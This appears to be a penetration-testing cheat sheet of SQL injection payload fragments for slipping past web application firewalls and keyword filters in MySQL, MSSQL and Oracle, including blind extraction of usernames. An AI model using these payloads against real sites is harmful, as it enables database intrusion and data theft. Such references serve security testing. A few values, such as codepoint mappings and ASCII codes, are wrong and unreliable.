<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Filter Evasion and WAF Bypassing
---
## DBMS Gadgets
```sql
# MySQL C-Style Comment Obfuscation (5.5.30 +)
SELECT 1 /*!50530 + 1 */
```
[MySql Functions and Operators](http://dev.mysql.com/doc/refman/5.7/en/functions.html)

## MySQL Magic with Numbers
```sql
id=1
id=--1
id=-+-+1
id=----2---1

# Bitwise
id=1&1
id=0|1
id=13^12
id=8>>3
id=~-2

# Logical Operators
id=NOT 0
id=!0
id=!1+1
id=1&&1
id=1 AND 1
id=!0 AND !1+1
id=1 || NULL
id=1 || !NULL
id=1 XOR 1

# Regular Expressions
id={anything} REGEXP '.*'
id={anything} NOT REGEXP '{randomkeys}'
id={anything} RLIKE '.*'
id={anything} NOT RLIKE '{randomkeys}'

# Comparison Operators
id=GREATEST(0,1)
id=COALESCE(NULL, 1)
id=ISNULL(1/0)
id=LEAST(2,1)
```

## Oracle Magic With Numbers
```sql
id=1
id=-(-1)
id=-(1)*-(1)
id=some(1)
```
[Oracle Conditions](https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions.htm#SQLRF005)
[Oracle Expressions](https://docs.oracle.com/cd/B28359_01/server.111/b28286/expressions.htm#SQLRF004)

## Mysql Universal Whitespace Chars
| Codepoint | Character |
| --- | --- |
| 9 | U+0009 CHARACTER TABULATION |
| 10 | U+000A LINE FEED (LF) |
| 11 | U+000B LINE TABULATION |
| 12 | U+000C FORM FEED |
| 13 | U+000D CARRIAGE RETURN (CR) |
| 32 | U+0020 SPACE |
```sql
SELECT[CHAR]name[CHAR]FROM[CHAR]employees;
```

## MSSQL Universal Whitespace Chars
| Codepoint | Character |
| --- | --- |
| 1 | U+0009 CHARACTER TABULATION |
| 2 | U+000A LINE FEED (LF) |
| 3 | U+000B LINE TABULATION |
| 32 | U+0020 SPACE |
| 160 | U+00A0 No-BREAK SPACE |
```sql
SELECT[CHAR]name[CHAR]FROM[CHAR]employees;
```

## Oracle Universal Whitespace Chars
| Codepoint | Character |
| --- | --- |
| 0 | U+0000 NULL |
| 9 | U+0009 CHARACTER TABULATION |
| 10 | U+000A LINE FEED (LF) |
| 11 | U+000B LINE TABULATION |
| 12 | U+000C FORM FEED |
| 13 | U+000D CARRIAGE RETURN (CR) |
| 32 | U+0020 SPACE |

## Important Factors for all DBMSs
> In all DBMSs we can use the "Plus Sign" to seperate almost all the keywords except FROM
```sql
SELECT+name FROM employees WHERE+id=1 AND+name LIKE+'J%';
```
[MySQL reserved keywords](https://dev.mysql.com/doc/refman/5.5/en/keywords.html)
[MySQL Server System Variables](http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html)
[MSSQL reserved keywords](http://msdn.microsoft.com/en-us/library/ms189822.aspx)
[MSSQL built-in functions](http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx)
[Oracle particular management of words](https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm)
```sql
# Oracle example of creating a table named "Database"
CREATE TABLE DATABASE (id number);
```

## Setting Custom Variables
```sql
SET @myvar={expression}
SET @myvar:={expression}
```

## MySQL Defining Strings
```sql
# basic strings
', "
_latin1'string'
SELECT _ascii'Break Meʢ'
```
[National Character Set](http://dev.mysql.com/doc/refman/5.7/en/charset-national.html)
```sql
SELECT N'mystring'
```
[bit-value-literals](https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html)
```sql
SELECT X'4F485045'
SELECT 0x4F485045
SELECT 'a'=B'1100001' # true
```

## MySQL Unicode
[Examples of the effect of collation](http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html)
```sql
SELECT 'admin'='ąďṁĩň' # true
```

## Escaping
[special characters used to escape](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html)
```sql
SELECT 'He\'llo'
SELECT 'He\%\_llo'
SELECT 'He''llo'
SELECT "He""llo"
SELECT '\H\e\l\l\o'
SELECT 'He\ll\o'
```

## String Concatenation
```sql
SELECT 'he' 'll' 'o'
SELECT CONCAT('he', 'll', 'o')
SELECT CONCAT_WS('', 'he', 'll', 'o') # with seperator
SELECT 'He'/**/'ll'/**/'o'
SELECT /**//**/'He'/**/'ll'/**/'o'/**/
SELECT /*!10000 'He' */'ll'/*****/'o'/*****/

# MSSQL
SELECT 'He'+'ll'+'o'
SELECT CONCAT('He', 'll', 'o')
SELECT 'He'/**/+/**/'ll'/**/+'o'
SELECT CONCAT(/**/'He',/**/1/**/,/**/'lo'/**/)

# Oracle
SELECT 'He'||'ll'||'o'
SELECT CONCAT('He', 'llo')
SELECT NVL('Hello','Goodbye')
SELECT q'[]'||'He'||'ll'/**/||'o'
SELECT CONCAT(/**/'He'/**/,/**/'ll'/**/)
```

## MySQL Type Conversion
```sql
SELECT ~'-2it\'s a kind of magic' # 1
SELECT ... version()=5.5
SELECT ... @@version=5.5
SELECT ... ('type'+'cast')=0 # true
SELECT -'-1337a kind of magic'-25 # 1337
```

## Bypassing Keyword Filters
> Case changing (old) -- SelEct
> [randomcase.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py)

> Intermediary Characters

```sql
SELECT/**/values/**/AND/**/.../**/OR/**/
SELECT[sp]values[sp]AND...[sp]OR[sp]
SELECT"values"FROM`table`WHERE/**/1
SELECT(values)FROM(table)WHERE(1)
SELECT"values"``FROM`table`WHERE(1)
SELECT+"values"%A0FROM`table`

# bypassing replaced keywords
AND = &&
OR = ||
# if the above are filtered use UNION
... UNION(SELECT 'values'...) && ...
... UNION ALL SELECT ...
... UNION DISTINCT SELECT ...
... /*!00000 UNION*//*!00000 SELECT*/ ...

# UNION filtered go blind
... (SELECT id FROM users LIMIT 1)='5' ...

# WHERE bypass
... SELECT id FROM users GROUP BY id HAVING id='5' ...

# GROUP BY bypass (blind)
... AND length((SELECT first char)='a') // 0/1 > true/false

# HAVING bypass (use GROUP_CONCAT blind)

# SELECT bypass (blind)
... AND COLUMN IS NOT NULL ... // bruteforce/guess existing columns
procedure analyse()
```

## Encoding Techniques
* URL encoding
* double URL encoding

## Bypassing Function Filters
> UNHEX, HEX, CHAR, ASCII, ORD

```sql
... SUBSTR(username,1,1)=UNHEX(48)
... SUBSTR(username,1,2)=UNHEX(4845)
... SUBSTR(username,1,5)=UNHEX('48454C4C4F')
... SUBSTR(username,1,5)=0x48454C4C4F

... HEX(SUBSTR(username,1,1))=48
... HEX(SUBSTR(username,1,2))=4845
... HEX(SUBSTR(username,1,5))='48454C4C4F'

... SUBSTR(username,1,1)=CHAR(72)
... SUBSTR(username,1,2)=CHAR(72,69)
... SUBSTR(username,1,2)=CONCAT(CHAR(72),CHAR(69))

... ASCII(SUBSTR(username,1,1))=48
... ORD(SUBSTR(username,1,1))=48
```
[MySQL CONV function](http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_conv)
```sql
# Can generate a string [a-zA-Z0-9]
CONV(10,10,36) // 'a'
CONV(11,10,36) // 'b'
# Append LOWER or LCASE / UPPER or UCASE to change casing
LCASE(CONV(10,10,36))
```
> Brute forcing strings: LOCATE, INSTR, POSITION

```sql
IF(LOCATE('H',SUBSTR(username,1,1)),1,0)
```
> SUBSTR, MID, SUBSTRING

```sql
[SUBSTR|MID|SUBSTRING]('hello' FROM 1 FOR 1)
[LEFT|RIGHT]('hello',2)
[LPAD|RPAD]('hello',6,'?') // ?hello of hello?
[LPAD|RPAD]('hello',1,'?') // h
[LPAD|RPAD]('hello',5,'?') // hello
```







